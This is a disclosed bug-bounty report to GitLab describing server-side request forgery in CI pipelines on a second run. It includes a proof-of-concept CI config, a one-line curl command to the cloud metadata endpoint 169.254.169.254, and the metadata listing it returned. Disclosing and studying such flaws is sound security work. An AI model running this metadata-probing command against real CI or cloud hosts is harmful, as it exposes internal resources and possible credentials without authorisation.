# SSRF in CI after first run

## Report Details
- **Report ID**: 369451
- **URL**: https://hackerone.com/reports/369451
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-06-21T06:03:43.506Z
- **Disclosed**: 2019-04-12T19:57:38.977Z

## Reporter
- **Username**: plazmaz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

**Summary:** 
During the first run, the CI pipeline seems to defend against SSRF properly, however when a build is re-run a second time, I am able to access internal metadata endpoints for digitalocean

**Description:**
The following resources are accessible on the second run of a CI build. For instance,
`http://169.254.169.254/metadata/v1.json` 
and `http://169.254.169.254/metadata/v1/`
are both visible.


## Steps To Reproduce:

(Add details for how we can reproduce the issue)

  1. Create a `.gitlab-ci.yml`. This was my PoC:

```
# This file is a template, and might need editing before it works on your project.
# Official framework image. Look for the different tagged releases at:
# https://hub.docker.com/r/library/node/tags/
image: node:latest

# This folder is cached between builds
# http://docs.gitlab.com/ce/ci/yaml/README.html#cache
cache:
  paths:
  - node_modules/

test:
  stage: test
  script:
    - npm install
    - npm test

pack:
  stage: deploy
  script:
    - chmod +x run.sh
    - ./run.sh
    - npm install
    - npm pack
  artifacts:
    paths:
    - ./*.tgz
```
  2. Create a bash file containing this line:  
```
curl -L http://169.254.169.254/metadata/v1/
```
  3. Run the build pipeline. It will work as intended with no leaks. Now re-run the build. You should see this output:

```
id
hostname  
user-data  
vendor-data  
public-keys  
region  
interfaces/  
dns/  
floating_ip/  
tags/  
features/  
```
This indicates access to internal resources, and thus successful SSRF.

## Impact

Any internal resources visible to the node. For gitlab cloud, this looks to be digitalocean metadata, but this will also allow access to any resources the gitlab server can see.

## Attachments
No attachments
